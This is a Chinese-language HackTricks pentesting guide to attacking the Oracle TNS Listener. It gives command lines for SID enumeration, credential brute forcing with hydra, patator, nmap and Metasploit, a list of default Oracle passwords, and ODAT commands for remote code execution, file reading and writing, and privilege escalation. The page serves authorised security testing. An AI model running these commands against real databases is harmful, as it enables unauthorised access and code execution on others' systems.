# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注我** [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

Oracle数据库（Oracle DB）是Oracle公司的关系数据库管理系统（RDBMS）（来自[这里](https://www.techopedia.com/definition/8711/oracle-database)）。

在枚举Oracle时，第一步是与通常位于默认端口（1521/TCP，-您也可能在1522-1529上获得次要监听器-）的TNS-Listener通信。
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## 概要

1. **枚举版本**信息（搜索**已知漏洞**）
2. **暴力破解TNS监听器**通信（并非总是需要）
3. **枚举**/暴力破解**SID名称**（如数据库名称）
4. 对发现的有效SID名称**暴力破解凭证**
5. 尝试**执行代码**

要使用MSF oracle模块，您需要安装一些依赖项：[**安装**](oracle-pentesting-requirements-installation.md)

## 枚举

可用于此的工具有：nmap、MSF和[tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip)。

### TNS监听器版本
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
其他有用的 TNS 监听器命令：

| **命令**  | **目的**                                                     |
| ------------ | --------------------------------------------------------------- |
| ping         | Ping 监听器                                               |
| version      | 提供监听器版本和平台信息的输出 |
| status       | 返回监听器当前状态和使用的变量    |
| services     | 转储服务数据                                               |
| debug        | 将调试信息转储到监听器日志                  |
| reload       | 重新加载监听器配置文件                          |
| save\_config | 将监听器配置文件写入备份位置      |
| stop         | 调用监听器关闭                                        |

如果你**收到错误**，可能是因为**TNS 版本不兼容**（使用 `tnscmd10` 带上 `--10G` 参数），如果**错误持续存在**，监听器可能**受密码保护**（你可以在这里看到一个列出所有[**详细错误的列表**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)）——别担心……hydra 来救援\*\*：\*\*
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
TNS 监听器可能容易受到 **MitM** 攻击。[点击此处查看如何检查服务器是否容易受到攻击以及如何执行攻击（适用于所有版本，直到 12c 版本）](tns-poison.md)。

### SID 枚举

#### **什么是 SID**

SID（服务标识符）本质上是数据库名称，根据安装情况，您可能有一个或多个默认的 SIDs，或者甚至是完全自定义的 dba 定义的 SID。

**在一些旧版本中（在 9 版本中有效）**，您可以请求 SID，数据库会将其发送给您：
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
如果您无法通过这种方式访问SID，您将需要对它们进行暴力破解：

**SID 暴力破解**

我已经将nmap和MSF的sid列表合并到这个列表中（没有重复项）：

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
为了使用 **patator** 的 **oracle\_login** 功能，你需要**安装**：
```
pip3 install cx_Oracle --upgrade
```
## **针对账户**

**获得SID了吗？** 很好，现在让我们进行下一个任务，提取用户账户信息。从这一点开始，您可以连接到监听器并暴力破解凭据。

**Metasploit** _\*\*scanner/oracle/oracle\_login_ 它内置了一个字典，用于**最常见的用户账户信息默认值**，呈现为登录名:密码。顺便说一下，这样的默认条目代表了Oracle中最常见和最严重的安全问题之一。

**Nmap** 也可以在这里提供帮助，使用脚本 _oracle-brute_。请注意，此脚本**混合了登录名和密码**，即它尝试将每个登录名与每个密码进行匹配，这需要相当长的时间！

### **默认密码**

以下是一些与Oracle关联的默认密码：

* **DBSNMP/DBSNMP** — 智能代理使用它与数据库服务器通信（更改它需要一些工作）
* **SYS/CHANGE\_ON\_INSTALL** — 包括Oracle v9之前的默认sysdba账户，从10g版本开始必须不同！
* **PCMS\_SYS/PCMS\_SYS** — 默认x账户
* **WMSYS/WMSYS** — 默认x账户
* **OUTLN/OUTLN** — 默认x账户
* **SCOTT/TIGER** — 默认x账户

其他**默认密码**可以在[这里](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)和[这里](https://cirt.net/passwords?vendor=Oracle)找到。

版本11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2和11.2.0.3容易受到**离线暴力破解**的攻击。[**在这里阅读更多关于这种技术的信息。**](remote-stealth-pass-brute-force.md)

### 用户/密码暴力破解

不同的工具提供了**不同的oracle用户/密码列表**：

* **oscan:** _/usr/share/oscanner/accounts.default_ (169行)
* **MSF-1:** _来自_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598行)
* **MSF-2:** _来自 scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568行)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687行)

我已经**混合了**所有这些列表并**移除了重复项**：

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [暴力破解](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

现在，您**知道了有效的SID和有效的凭据**。要连接到数据库，您需要工具：_**sqlplus**_，并且需要按照一些步骤进行安装：

[安装](oracle-pentesting-requirements-installation.md)

使用已知凭据登录：
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
如果 TNS 监听器位于非默认端口（例如 TCP/1522）：
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
如果一个**账户具有系统数据库权限（sysdba）或系统操作员（sysop）**，你可能想尝试以下操作：
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **All in One**

**一个有趣的工具是 oscanner**，它会尝试获取一些有效的SID，然后它会暴力破解有效凭证并尝试提取一些信息：
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
另一个可以完成所有这些任务的工具是 [**odat**](https://github.com/quentinhardy/odat)：
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
使用这些选项（_-s_ 和 _-p_），ODAT 将在第一步中**搜索有效的 SID**（系统 ID）。您可以配置一些选项来配置方法（例如，单词列表或暴力破解攻击）。默认情况下，ODAT 将使用一个大单词列表，并且它将进行一次小型暴力破解攻击。

如果 ODAT **至少找到一个 SID**（例如 _ORCL_），它将**搜索有效的 Oracle 账户**。它将对**每个找到的 SID**执行此操作。您可以为凭据指定一些选项（例如，_--accounts-file_、_--accounts-files_、_--login-as-pwd_）。

对于**每个有效的账户**（例如 _SYS_）**在每个有效的实例**（SID）上，ODAT 将返回**每个 Oracle 用户能做什么**（例如，反向 shell，读取文件，成为 DBA）。

[**Wiki odat**](https://github.com/quentinhardy/odat/wiki)

## 远程代码执行

至少有两种不同的方法可以执行命令，例如使用 Java 程序和 DBMS_SCHEDULER 包。顺便说一下，如果 SQL 注入在一个网络应用程序中，并且运行它的用户有足够的权限，您也可以实现 RCE。在这个阶段，我强烈推荐准备 Oracle 数据库攻击工具：[ODAT](https://github.com/quentinhardy/odat)。

### 安装 ODAT
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### 通过Java存储过程执行代码
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
[更多详情请见此处](oracle-rce-and-more.md#rce-java-store-procedure)

### 通过调度器执行代码
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[更多详情](oracle-rce-and-more.md#rce-scheduler)

### 通过外部表执行代码
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
`ODAT.py` 需要 `CREATE ANY DIRECTORY` 权限，该权限默认只授予 DBA 角色，因为它尝试从任何目录而不仅仅是“你的”目录执行文件（这种攻击的手动版本需要的权限较少）。

[更多详情点击这里。](oracle-rce-and-more.md#rce-external-tables)

## 读/写文件
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[更多详情请见此处](oracle-rce-and-more.md#read-write-files)

## 提升权限

[更多详情请见此处](oracle-rce-and-more.md#elevating-privileges)

您可以使用 odat 的 [privesc](https://github.com/quentinhardy/odat/wiki/privesc) 模块来提升权限。在该链接中，您可以找到**使用 odat 提升权限的多种方式。**
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
漏洞在 oracle 10.1.0.3.0 上进行了测试 - 应该适用于 10.1.0.5.0，并且据说适用于 11g。通过 2007 年 10 月 Oracle 关键补丁更新修复。
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## 免费虚拟环境进行测试

如果您想练习攻击Oracle数据库，最安全的方法是注册Oracle Developer Days Virtualbox VM：

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

这篇文章中的大部分信息摘自：[https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) 和 [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

其他有趣的**参考资料**：

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## HackTricks自动命令
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
